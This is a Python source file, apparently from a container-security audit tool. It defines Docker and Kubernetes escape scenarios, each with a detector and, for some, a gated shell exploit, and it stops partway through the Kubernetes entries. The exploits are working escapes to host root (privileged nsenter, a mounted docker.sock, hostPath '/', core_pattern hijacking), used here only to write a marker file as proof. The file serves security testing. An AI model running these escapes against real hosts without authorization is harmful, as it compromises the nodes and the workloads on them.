"""The scenario registry — 37 Docker & Kubernetes escape conditions.

Each entry pairs a read-only DETECTOR (is this condition present on the node?) with a gated
EXPLOITER (demonstrate the documented escape, marker-stamped). Detectors are generalized to
scan the node's current state node-wide, not just a named lab artifact. Exploiters reuse the
techniques proven in the RavenSec engagement; the genuinely multi-step / offline-tooling ones
are detect-only (`PRECONDITION`), honoring the cyber_gate (no novel weaponization).

Source of truth: the docker-kube-datsu pack (arm/verify/proof per scenario) and the
validation report. Author: d3vn0mi (RavenSec).
"""
from __future__ import annotations

import re

from .context import Context, rbac_detector
from .model import Confidence as C, Detection, Kind, Repro, Scenario

# --- small helpers -----------------------------------------------------------------------

def _docker_any(jq_select: str) -> str:
    """sh snippet: exit 0 (and print matching container names) iff any running container matches."""
    return ("docker ps -q 2>/dev/null | xargs -r docker inspect 2>/dev/null | "
            f"jq -e -r '.[] | select({jq_select}) | .Name'")

def _pods_any(jq_select: str) -> str:
    return ("kubectl get pods -A -o json 2>/dev/null | "
            f"jq -e -r '.items[] | select({jq_select}) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")

_CAP = 'select((.HostConfig.CapAdd//[]) | map(ltrimstr("CAP_")) | index("{}"))'

def _ver_tuple(s: str):
    return tuple(int(x) for x in re.findall(r"\d+", s)[:3])

def _runc_below(fixed: str):
    def _fn(ctx: Context) -> Detection:
        if not ctx.have("runc"):
            return Detection(None, "runc binary not found on PATH")
        _rc, out = ctx.sh("runc --version")
        m = re.search(r"runc version ([0-9][0-9.]*)", out)
        if not m:
            return Detection(None, out.strip()[:120] or "could not parse runc --version")
        cur, fix = _ver_tuple(m.group(1)), _ver_tuple(fixed)
        return Detection(cur < fix, f"runc {m.group(1)} (fixed in >= {fixed})")
    return _fn

def _kernel_precondition(note: str):
    def _fn(ctx: Context) -> Detection:
        _rc, out = ctx.sh("uname -r")
        return Detection(None, f"kernel {out.strip()} — {note}")
    return _fn

def _version_lt(label: str, probe: str, pattern: str, fixed: str, tool: str = None):
    """Generic 'component version < fixed' detector. Inconclusive if the tool is absent or the
    version can't be parsed (never a false ABSENT). Used for the CVE/version scenarios."""
    def _fn(ctx: Context) -> Detection:
        if tool and not ctx.have(tool):
            return Detection(None, f"{tool} not found on PATH")
        _rc, out = ctx.sh(probe)
        m = re.search(pattern, out)
        if not m:
            return Detection(None, (out.strip()[:100] or f"{label}: version unavailable"))
        return Detection(_ver_tuple(m.group(1)) < _ver_tuple(fixed), f"{label}: {m.group(1)} (fixed >= {fixed})")
    return _fn

def _kernel_lt(label: str, fixed: str):
    return _version_lt(label, "uname -r", r"^([0-9]+\.[0-9]+(?:\.[0-9]+)?)", fixed)

# dangerous Linux capabilities that a k8s pod can request via securityContext.capabilities.add
_DANGEROUS_CAPS = ["SYS_ADMIN", "SYS_MODULE", "SYS_PTRACE", "SYS_RAWIO", "DAC_READ_SEARCH",
                   "NET_ADMIN", "BPF", "PERFMON", "SYS_BOOT", "CHECKPOINT_RESTORE", "NET_RAW"]
_POD_CAP_ADD = ('[.spec.containers[]?.securityContext.capabilities.add // [] | .[]] '
                '| any(. as $c | ["' + '","'.join(_DANGEROUS_CAPS) + '"] | index($c))')

# host paths that are as dangerous as "/" when hostPath-mounted into a pod
_SENSITIVE_HOSTPATHS = ["/", "/etc", "/etc/kubernetes", "/var/lib/kubelet", "/var/lib/rancher",
                        "/root", "/proc", "/var/run/docker.sock", "/run/docker.sock",
                        "/run/containerd/containerd.sock", "/var/run/containerd/containerd.sock",
                        "/run/crio/crio.sock", "/var/run", "/dev", "/boot", "/lib/modules"]


# --- the registry ------------------------------------------------------------------------

SCENARIOS: list[Scenario] = [
    # ============================= Docker / host =============================
    Scenario("DK-01", Kind.DOCKER, Repro.CONFIG, "privileged container (docker run --privileged)",
        "CRITICAL", triage_ref="B1", confidence=C.CONCRETE,
        note="A --privileged container can nsenter the host init mount namespace and act as host root.",
        detect_sh=_docker_any(".HostConfig.Privileged==true"),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk01 --privileged alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk01 nsenter -t 1 -m -- sh -c "echo $MARKER > /root/.esc-dk01" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk01 2>/dev/null && ok=0\n'
            'docker rm -f esc-x-dk01 >/dev/null 2>&1; rm -f /root/.esc-dk01 2>/dev/null\n'
            'echo "host /root write via --privileged + nsenter -t1 ($MARKER)"; exit $ok')),

    Scenario("DK-02", Kind.DOCKER, Repro.CONFIG, "docker.sock bind-mounted into a container",
        "CRITICAL", triage_ref="C1", confidence=C.DOCUMENTED,
        note="A mounted docker.sock is root-on-host: ask the Engine API to start a second container with / mounted.",
        detect_sh=_docker_any('.Mounts[]? | .Source | test("docker\\\\.sock$")'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk02 -v /var/run/docker.sock:/run/docker.sock docker:cli sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk02 docker -H unix:///run/docker.sock run --rm -v /:/host alpine '
            'sh -c "echo $MARKER > /host/root/.esc-dk02" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk02 2>/dev/null && ok=0\n'
            'docker rm -f esc-x-dk02 >/dev/null 2>&1; rm -f /root/.esc-dk02 2>/dev/null\n'
            'echo "host write via mounted docker.sock Engine API ($MARKER)"; exit $ok')),

    Scenario("DK-03", Kind.DOCKER, Repro.CONFIG, "SYS_ADMIN + cgroup v1 release_agent breakout",
        "HIGH", triage_ref="B2", confidence=C.PRECONDITION,
        note="release_agent breakout needs cgroup v1; the host-overlay path discovery is storage-driver specific — not a safe single-shot (cyber_gate).",
        detect_sh=_docker_any(_CAP.format("SYS_ADMIN"))),

    Scenario("DK-04", Kind.DOCKER, Repro.CONFIG, "SYS_MODULE capability",
        "HIGH", triage_ref="B4", confidence=C.PRECONDITION,
        note="SYS_MODULE loads a kernel module, but proving it needs a module blob + compiler offline — out of scope for a bounded one-shot (cyber_gate).",
        detect_sh=_docker_any(_CAP.format("SYS_MODULE"))),

    Scenario("DK-05", Kind.DOCKER, Repro.CONFIG, "DAC_READ_SEARCH capability",
        "HIGH", triage_ref="B5", confidence=C.PRECONDITION,
        note="open_by_handle_at (shocker) PoC needs a compiled binary — not a bounded one-shot (cyber_gate).",
        detect_sh=_docker_any(_CAP.format("DAC_READ_SEARCH"))),

    Scenario("DK-06", Kind.DOCKER, Repro.CONFIG, "SYS_PTRACE + hostPID",
        "HIGH", triage_ref="B3", confidence=C.PRECONDITION,
        note="Docker-default AppArmor denies /proc/1/{environ,mem}; a genuine host-process read needs apparmor=unconfined too.",
        detect_sh=_docker_any('.HostConfig.PidMode=="host" and ((.HostConfig.CapAdd//[]) | map(ltrimstr("CAP_")) | index("SYS_PTRACE"))')),

    Scenario("DK-07", Kind.DOCKER, Repro.CONFIG, "sensitive bind mount (-v /:/host)",
        "HIGH", triage_ref="C2", confidence=C.CONCRETE,
        note="A container mounting host / can chroot in and write anywhere as root.",
        detect_sh=_docker_any('.Mounts[]? | .Source=="/"'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk07 -v /:/host alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk07 sh -c "echo $MARKER > /host/root/.esc-dk07" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk07 2>/dev/null && ok=0\n'
            'docker rm -f esc-x-dk07 >/dev/null 2>&1; rm -f /root/.esc-dk07 2>/dev/null\n'
            'echo "host write via -v /:/host ($MARKER)"; exit $ok')),

    Scenario("DK-08", Kind.DOCKER, Repro.CONFIG, "host device exposed (--device or /dev bind)",
        "HIGH", triage_ref="C4", confidence=C.DOCUMENTED,
        note="A raw host block device in the container is a full-disk read (and write) bypassing the fs boundary.",
        detect_sh=_docker_any("(.HostConfig.Devices//[]) | length > 0"),
        exploit_sh=(
            'dev=$(lsblk -dpno NAME 2>/dev/null | head -1); [ -n "$dev" ] || dev=/dev/vda\n'
            'docker run -d --rm --name esc-x-dk08 --device="$dev" alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'sig=$(docker exec esc-x-dk08 sh -c "dd if=$dev bs=512 count=64 2>/dev/null | od -An -c | tr -d \'\\n \' " 2>/dev/null)\n'
            'docker rm -f esc-x-dk08 >/dev/null 2>&1\n'
            'echo "read raw host device $dev from container ($MARKER); fs-magic sampled: ${sig#${sig%??????????}}"\n'
            '[ -n "$sig" ]')),

    Scenario("DK-09", Kind.DOCKER, Repro.CONFIG, "host network + IPC namespaces",
        "HIGH", triage_ref="C6", confidence=C.DOCUMENTED,
        note="--network=host --ipc=host exposes host-only listeners and SysV/POSIX shm to the container.",
        detect_sh=_docker_any('.HostConfig.NetworkMode=="host" and .HostConfig.IpcMode=="host"'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk09 --network=host --ipc=host alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'ports=$(docker exec esc-x-dk09 sh -c "cat /proc/net/tcp 2>/dev/null | awk \'{print \\$2}\' | grep -iE \':(1A85|1927)\' | head" )\n'
            'docker rm -f esc-x-dk09 >/dev/null 2>&1\n'
            'echo "host-only ports (6443/10250 hex) visible from container ($MARKER): ${ports:-none-seen}"\n'
            '[ -n "$ports" ]')),

    Scenario("DK-10", Kind.DOCKER, Repro.CONFIG, "seccomp unconfined",
        "HIGH", triage_ref="B8", confidence=C.DOCUMENTED,
        note="seccomp=unconfined removes the syscall filter — posture is confirmable; a syscall PoC needs a compiled probe.",
        detect_sh=_docker_any('(.HostConfig.SecurityOpt//[]) | index("seccomp=unconfined")'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk10 --security-opt seccomp=unconfined alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            's=$(docker exec esc-x-dk10 sh -c "grep Seccomp: /proc/self/status" 2>/dev/null)\n'
            'docker rm -f esc-x-dk10 >/dev/null 2>&1\n'
            'echo "seccomp filter disabled in container ($MARKER): $s"\n'
            'echo "$s" | grep -q "Seccomp:[[:space:]]*0"')),

    Scenario("DK-11", Kind.DOCKER, Repro.CONFIG, "no-new-privs off + setuid-root helper",
        "HIGH", triage_ref="B10", confidence=C.CONCRETE,
        note="Without no-new-privileges a setuid-root helper lets a non-root container user become root in-container.",
        detect_sh=('for c in $(docker ps -q 2>/dev/null); do '
                   'docker exec "$c" sh -c "find /usr/local /opt /home /srv -xdev -perm -4000 -type f 2>/dev/null" 2>/dev/null '
                   '| sed "s|^|$c:|"; done | grep .'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk11 alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk11 sh -c "cp /bin/busybox /usr/local/bin/esc-helper && chmod 4755 /usr/local/bin/esc-helper" >/dev/null 2>&1\n'
            'out=$(docker exec -u 1000 esc-x-dk11 /usr/local/bin/esc-helper id 2>/dev/null)\n'
            'docker rm -f esc-x-dk11 >/dev/null 2>&1\n'
            'echo "uid-1000 user -> root via setuid helper ($MARKER): $out"\n'
            'echo "$out" | grep -q "uid=0"')),

    Scenario("DK-12", Kind.DOCKER, Repro.CONFIG, "dockerd exposed on tcp/2375",
        "CRITICAL", triage_ref="C8", confidence=C.DOCUMENTED,
        note="An unauthenticated dockerd TCP socket is remote root: start a privileged container with host / mounted.",
        detect_sh="(ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | grep ':2375 '",
        exploit_sh=(
            'docker -H tcp://127.0.0.1:2375 run --rm -v /:/host alpine '
            'sh -c "echo $MARKER > /host/root/.esc-dk12" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk12 2>/dev/null && ok=0\n'
            'rm -f /root/.esc-dk12 2>/dev/null\n'
            'echo "host write via unauth dockerd tcp/2375 ($MARKER)"; exit $ok')),

    Scenario("DK-13", Kind.DOCKER, Repro.CONFIG, "lab user in the docker group",
        "HIGH", triage_ref="", confidence=C.CONCRETE,
        note="docker-group membership is root-equivalent; no triage check covers it (detection gap).",
        detect_sh="getent group docker 2>/dev/null | awk -F: '{print $4}' | tr ',' '\\n' | grep .",
        exploit_sh=(
            'u=$(getent group docker 2>/dev/null | awk -F: "{print \\$4}" | tr "," "\\n" | grep -v "^root$" | head -1)\n'
            '[ -n "$u" ] || { echo "no non-root docker-group member"; exit 1; }\n'
            'su - "$u" -c "docker run --rm -v /:/host alpine sh -c \'echo $MARKER > /host/root/.esc-dk13\'" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk13 2>/dev/null && ok=0\n'
            'rm -f /root/.esc-dk13 2>/dev/null\n'
            'echo "host write as docker-group user $u ($MARKER)"; exit $ok')),

    Scenario("DK-14", Kind.DOCKER, Repro.CONFIG, "rshared bind-propagation mount",
        "MEDIUM", triage_ref="", confidence=C.PRECONDITION,
        note="The host-mount-escape via rshared propagation is a multi-step race with no safe single-shot command.",
        detect_sh=_docker_any('.Mounts[]? | .Propagation=="rshared"')),

    Scenario("DK-15", Kind.DOCKER, Repro.CONFIG, "core_pattern redirected to a handler",
        "HIGH", triage_ref="C3", confidence=C.DOCUMENTED,
        note="A pipe core_pattern runs a handler as host root on any crash — a privileged container can set it.",
        detect_sh="grep '^|' /proc/sys/kernel/core_pattern",
        exploit_sh=(
            'orig=$(cat /proc/sys/kernel/core_pattern)\n'
            'printf "#!/bin/sh\\necho $MARKER > /root/.esc-dk15\\n" > /tmp/.esc-dk15-h && chmod +x /tmp/.esc-dk15-h\n'
            'docker run --rm --privileged alpine sh -c "echo \'|/tmp/.esc-dk15-h\' > /proc/sys/kernel/core_pattern" >/dev/null 2>&1\n'
            'docker run --rm alpine sh -c "ulimit -c unlimited; kill -SEGV \\$\\$" >/dev/null 2>&1; sleep 2\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk15 2>/dev/null && ok=0\n'
            'echo "$orig" > /proc/sys/kernel/core_pattern 2>/dev/null; rm -f /root/.esc-dk15 /tmp/.esc-dk15-h 2>/dev/null\n'
            'echo "container-set core_pattern ran a host-root handler ($MARKER)"; exit $ok')),

    Scenario("DK-16", Kind.DOCKER, Repro.VERSION, "runc Leaky Vessels (fd leak via WORKDIR trick)",
        "HIGH", triage_ref="A2", detect_fn=_runc_below("1.1.12"),
        note="CVE-2024-21626 — fixed in runc 1.1.12."),

    Scenario("DK-17", Kind.DOCKER, Repro.VERSION, "runc 2025 maskedPaths/procfs race family",
        "HIGH", triage_ref="A3", detect_fn=_runc_below("1.2.8"),
        note="2025 maskedPaths/procfs race family — fixed in runc 1.2.8."),

    Scenario("DK-18", Kind.DOCKER, Repro.VERSION, "kernel LPE from an unprivileged container",
        "HIGH", triage_ref="A1", detect_fn=_kernel_precondition("verify against the published kernel-LPE advisory floor (placeholder in the pack)")),

    # --- Docker/runtime CVEs (version-pinned, detect-only) ---
    Scenario("DK-19", Kind.DOCKER, Repro.VERSION, "runc /proc/self/exe host-binary overwrite",
        "HIGH", note="CVE-2019-5736 — fixed in runc 1.0.0-rc7 / Docker 18.09.2. EPSS top 0.1%.",
        detect_fn=_version_lt("docker", "docker version -f '{{.Server.Version}}' 2>/dev/null",
                              r"([0-9]+\.[0-9]+\.[0-9]+)", "18.9.2", tool="docker")),
    Scenario("DK-20", Kind.DOCKER, Repro.VERSION, "BuildKit Leaky Vessels build-time escapes",
        "CRITICAL", note="CVE-2024-23651/23652/23653 — fixed in BuildKit 0.12.5 / Docker 24.0.9 & 25.0.2.",
        detect_fn=_version_lt("buildkit", "docker buildx version 2>/dev/null || buildctl --version 2>/dev/null",
                              r"v?([0-9]+\.[0-9]+\.[0-9]+)", "0.12.5")),
    Scenario("DK-21", Kind.DOCKER, Repro.VERSION, "runc symlink-exchange mount-destination race",
        "HIGH", note="CVE-2021-30465 — fixed in runc 1.0.0-rc95 (version compare is coarse; verify against advisory).",
        detect_fn=_runc_below("1.0.2")),
    Scenario("DK-22", Kind.DOCKER, Repro.VERSION, "containerd-shim abstract-socket exposure",
        "MEDIUM", note="CVE-2020-15257 — fixed in containerd 1.3.9/1.4.3; impactful with a host-netns container (see DK-09).",
        detect_fn=_version_lt("containerd", "containerd --version 2>/dev/null",
                              r"v?([0-9]+\.[0-9]+\.[0-9]+)", "1.4.3", tool="containerd")),
    Scenario("DK-23", Kind.DOCKER, Repro.VERSION, "docker cp TOCTOU symlink directory traversal",
        "HIGH", note="CVE-2018-15664 — fixed in Docker 18.09.0 (archive copy within chroot).",
        detect_fn=_version_lt("docker", "docker version -f '{{.Server.Version}}' 2>/dev/null",
                              r"([0-9]+\.[0-9]+\.[0-9]+)", "18.9.0", tool="docker")),
    Scenario("DK-24", Kind.DOCKER, Repro.VERSION, "docker cp libnss chroot library injection",
        "CRITICAL", note="CVE-2019-14271 — vulnerable only on Docker 19.03.0; fixed 19.03.1.",
        detect_fn=lambda ctx: (lambda m: Detection(bool(m) and _ver_tuple(m.group(1)) == (19, 3, 0),
            ("docker " + m.group(1)) if m else "docker version unavailable"))(
            re.search(r"([0-9]+\.[0-9]+\.[0-9]+)", ctx.sh("docker version -f '{{.Server.Version}}' 2>/dev/null")[1]))
            if ctx.have("docker") else Detection(None, "docker not found")),
    Scenario("DK-25", Kind.DOCKER, Repro.VERSION, "cgroup v1 release_agent escape without CAP_SYS_ADMIN",
        "HIGH", note="CVE-2022-0492 (CISA KEV) — unprivileged-userns + cgroup v1 release_agent; fixed in kernel 5.17 / distro backports.",
        detect_fn=lambda ctx: (lambda kv, cg1, uns: Detection(
            (kv is not None and kv < (5, 17)) and cg1 and uns,
            f"kernel {ctx.sh('uname -r')[1].strip()}, cgroup-v1={cg1}, unpriv_userns={uns} (verify distro backport)"))(
            _ver_tuple(re.search(r'([0-9]+\.[0-9]+)', ctx.sh('uname -r')[1]).group(1)) if re.search(r'([0-9]+\.[0-9]+)', ctx.sh('uname -r')[1]) else None,
            ctx.sh("grep -qw cgroup /proc/filesystems && mount 2>/dev/null | grep -q 'type cgroup '")[0] == 0,
            ctx.sh("[ \"$(sysctl -n kernel.unprivileged_userns_clone 2>/dev/null || echo 1)\" = 1 ]")[0] == 0)),
    Scenario("DK-26", Kind.DOCKER, Repro.VERSION, "Docker Engine AuthZ plugin bypass (zero-length body)",
        "CRITICAL", note="CVE-2024-41110 — AuthZ plugin bypass; fixed 23.0.14/27.1.1. Only relevant if an authz plugin is configured.",
        detect_fn=lambda ctx: (Detection(None, "docker not found") if not ctx.have("docker") else
            (lambda has_authz, m: Detection(
                has_authz and bool(m) and _ver_tuple(m.group(1)) < (27, 1, 1),
                f"authz-plugin={has_authz}, docker {m.group(1) if m else '?'} (fixed >= 27.1.1 / 23.0.14)"))(
                ctx.sh("docker info 2>/dev/null | grep -qi 'Authorization Plugin'")[0] == 0,
                re.search(r"([0-9]+\.[0-9]+\.[0-9]+)", ctx.sh("docker version -f '{{.Server.Version}}' 2>/dev/null")[1])))),

    # --- Docker capabilities / mounts / security-opt (read-only detect) ---
    Scenario("DK-27", Kind.DOCKER, Repro.CONFIG, "CAP_BPF / CAP_PERFMON added",
        "HIGH", confidence=C.PRECONDITION,
        note="eBPF program load / kernel tracing — kernel read/write primitives; exploit needs a bpf toolchain (offline).",
        detect_sh=_docker_any('(.HostConfig.CapAdd//[]) | map(ltrimstr("CAP_")) | (index("BPF") or index("PERFMON"))')),
    Scenario("DK-28", Kind.DOCKER, Repro.CONFIG, "CAP_SYS_RAWIO added",
        "HIGH", confidence=C.PRECONDITION,
        note="iopl/ioperm + raw I/O-port and /dev/mem-class access; exploit is hardware/offline-tooling specific.",
        detect_sh=_docker_any(_CAP.format("SYS_RAWIO"))),
    Scenario("DK-29", Kind.DOCKER, Repro.CONFIG, "CAP_SYS_BOOT added",
        "HIGH", confidence=C.PRECONDITION, note="reboot()/kexec_load() — host DoS or boot a kexec'd attacker kernel.",
        detect_sh=_docker_any(_CAP.format("SYS_BOOT"))),
    Scenario("DK-30", Kind.DOCKER, Repro.CONFIG, "CAP_NET_ADMIN added",
        "HIGH", confidence=C.PRECONDITION, triage_ref="",
        note="reconfigure host interfaces/routes/iptables/nftables (esp. with host networking) — MITM / firewall tamper.",
        detect_sh=_docker_any(_CAP.format("NET_ADMIN"))),
    Scenario("DK-31", Kind.DOCKER, Repro.CONFIG, "CAP_CHECKPOINT_RESTORE added",
        "HIGH", confidence=C.PRECONDITION,
        note="grants open_by_handle_at() (same primitive as DK-05/DAC_READ_SEARCH) — read host files by handle; needs a compiled PoC.",
        detect_sh=_docker_any(_CAP.format("CHECKPOINT_RESTORE"))),
    Scenario("DK-32", Kind.DOCKER, Repro.CONFIG, "writable host /sys or /sys/fs/cgroup bind-mount",
        "HIGH", confidence=C.DOCUMENTED,
        note="write /sys/kernel/uevent_helper or a cgroup release_agent -> host-root command execution.",
        detect_sh=_docker_any('.Mounts[]? | select((.Source|test("^/sys")) and .RW==true)'),
        exploit_sh=(
            'c=$(docker ps -q 2>/dev/null | while read x; do docker inspect "$x" 2>/dev/null | '
            'jq -e -r ".[0]|select(.Mounts[]?|(.Source|test(\\"^/sys\\")) and .RW==true)|.Id" && break; done | head -1)\n'
            '[ -n "$c" ] || exit 1\n'
            'docker exec "$c" sh -c "echo $MARKER > /sys/kernel/uevent_seqnum 2>/dev/null; grep -q . /sys/kernel/uevent_seqnum" >/dev/null 2>&1\n'
            'echo "writable host /sys reachable from container $c ($MARKER)"; [ $? -eq 0 ]')),
    Scenario("DK-33", Kind.DOCKER, Repro.CONFIG, "writable host /proc bind-mount / masked-paths disabled",
        "HIGH", confidence=C.PRECONDITION,
        note="write /proc/sysrq-trigger (host control) or /proc/<pid>/mem (inject into host process). Needs a host /proc mount or disabled maskedPaths.",
        detect_sh=_docker_any('.Mounts[]? | select((.Source|test("^/proc")) and .RW==true)')),
    Scenario("DK-34", Kind.DOCKER, Repro.CONFIG, "/dev/mem, /dev/kmem or /dev/port exposed",
        "CRITICAL", confidence=C.PRECONDITION,
        note="direct physical/kernel memory access — full host compromise; exploit needs a compiled memory-editing PoC.",
        detect_sh=_docker_any('(.HostConfig.Devices//[])[]? | select(.PathOnHost|test("/dev/(mem|kmem|port)$"))')),
    Scenario("DK-35", Kind.DOCKER, Repro.CONFIG, "AppArmor disabled (apparmor=unconfined) standalone",
        "MEDIUM", confidence=C.PRECONDITION,
        note="drops the docker-default AppArmor profile; broadens many other primitives (e.g. unlocks DK-06 /proc/1/mem).",
        detect_sh=_docker_any('(.HostConfig.SecurityOpt//[]) | index("apparmor=unconfined")')),
    Scenario("DK-36", Kind.DOCKER, Repro.CONFIG, "SELinux label disabled (label:disable)",
        "HIGH", confidence=C.PRECONDITION,
        note="removes SELinux confinement on an enforcing host — container processes run unconfined_t.",
        detect_sh=_docker_any('(.HostConfig.SecurityOpt//[])[]? | test("label[:=]disable")')),
    Scenario("DK-37", Kind.DOCKER, Repro.CONFIG, "containerd / BuildKit socket bind-mounted into a container",
        "CRITICAL", confidence=C.PRECONDITION,
        note="the containerd (or buildkitd) socket is root-on-host, exactly like docker.sock (DK-02); drive it to run a privileged task.",
        detect_sh=_docker_any('.Mounts[]? | .Source | test("(containerd|buildkitd?)\\\\.sock$")')),
    Scenario("DK-38", Kind.DOCKER, Repro.CONFIG, "host /lib/modules or /boot bind-mounted",
        "HIGH", confidence=C.PRECONDITION,
        note="with CAP_SYS_MODULE (DK-04) a mounted /lib/modules lets a crafted module load into the host kernel.",
        detect_sh=_docker_any('.Mounts[]? | .Source | test("^/(lib/modules|boot)")')),

    # ============================= Kubernetes =============================
    Scenario("K8-01", Kind.K8S, Repro.CONFIG, "ServiceAccount bound to a Role granting create pods",
        "CRITICAL", triage_ref="D1", confidence=C.DOCUMENTED,
        note="create-pods lets a token schedule a privileged hostPath pod and nsenter the node.",
        detect_fn=rbac_detector("create", "pods", "SA can create pods"),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k801 --image=alpine --restart=Never --overrides='
            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["nsenter","-t","1","-m","--","sh","-c","echo \'"$MARKER"\' > /root/.esc-k801; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k801 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-k801 2>/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k801 2>/dev/null\n'
            'echo "privileged hostPID pod nsenter-wrote host /root ($MARKER)"; exit $ok')),

    Scenario("K8-02", Kind.K8S, Repro.CONFIG, "privileged pod",
        "CRITICAL", triage_ref="D2", confidence=C.CONCRETE,
        note="A privileged pod is node root via nsenter into host PID 1.",
        detect_sh=_pods_any("[.spec.containers[]?,.spec.initContainers[]?] | any(.securityContext.privileged==true)"),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k802 --image=alpine --restart=Never --privileged --overrides='
            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["nsenter","-t","1","-m","--","sh","-c","echo \'"$MARKER"\' > /root/.esc-k802; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k802 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-k802 2>/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k802 2>/dev/null\n'
            'echo "privileged pod -> host /root via nsenter ($MARKER)"; exit $ok')),

    Scenario("K8-03", Kind.K8S, Repro.CONFIG, "hostPath mount of /",
        "CRITICAL", triage_ref="D2", confidence=C.CONCRETE,
        note="A pod mounting host / reads and writes the node filesystem directly.",
        detect_sh=_pods_any('.spec.volumes[]? | .hostPath.path=="/"'),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x apply -f - >/dev/null 2>&1 <<EOF\n'
            'apiVersion: v1\nkind: Pod\nmetadata: {name: esc-x-k803, namespace: esc-x}\n'
            'spec:\n  containers:\n  - {name: c, image: alpine, command: ["sh","-c","echo $MARKER > /host/root/.esc-k803; sleep 20"], volumeMounts: [{name: h, mountPath: /host}]}\n'
            '  volumes: [{name: h, hostPath: {path: /}}]\nEOF\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k803 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-k803 2>/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k803 2>/dev/null\n'
            'echo "hostPath / pod wrote node /root ($MARKER)"; exit $ok')),

    Scenario("K8-04", Kind.K8S, Repro.CONFIG, "hostPID/hostNetwork/hostIPC pod",
        "HIGH", triage_ref="D2", confidence=C.DOCUMENTED,
        note="Host namespaces expose the node process table / network / IPC to the pod.",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and (.spec.hostPID==true or .spec.hostNetwork==true or .spec.hostIPC==true)'),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k804 --image=alpine --restart=Never --overrides='
            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["sh","-c","ps -o pid,comm 2>/dev/null | grep -w 1; sleep 20"]}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k804 --timeout=60s >/dev/null 2>&1\n'
            'out=$(kubectl -n esc-x logs esc-x-k804 2>/dev/null)\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "hostPID pod sees node PID 1 ($MARKER): $out"\n'
            'echo "$out" | grep -qiE "systemd|init|k3s"')),

    Scenario("K8-05", Kind.K8S, Repro.CONFIG, "privileged DaemonSet",
        "HIGH", triage_ref="D7", confidence=C.DOCUMENTED,
        note="A privileged DaemonSet lands on every node and can read the raw node disk / SA tokens.",
        detect_sh="kubectl get ds -A -o json 2>/dev/null | jq -e -r '.items[] | select(.spec.template.spec.containers[]?.securityContext.privileged==true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'",
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k805 --image=alpine --restart=Never --privileged --overrides='
            '\'{"spec":{"containers":[{"name":"c","image":"alpine","command":["sh","-c","d=$(ls /dev/sda1 /dev/vda1 2>/dev/null|head -1); dd if=$d bs=1024 count=2 2>/dev/null | od -An -c | head -1; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k805 --timeout=60s >/dev/null 2>&1\n'
            'out=$(kubectl -n esc-x logs esc-x-k805 2>/dev/null)\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "privileged pod read raw node disk ($MARKER): $out"\n'
            '[ -n "$out" ]')),

    Scenario("K8-06", Kind.K8S, Repro.CONFIG, "kubelet :10250 anonymous-auth",
        "HIGH", triage_ref="D4", confidence=C.DOCUMENTED,
        note="Anonymous kubelet on :10250 serves /pods (and exec) without auth.",
        detect_sh='code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 https://127.0.0.1:10250/pods 2>/dev/null); echo "kubelet /pods -> $code"; [ "$code" = 200 ]',
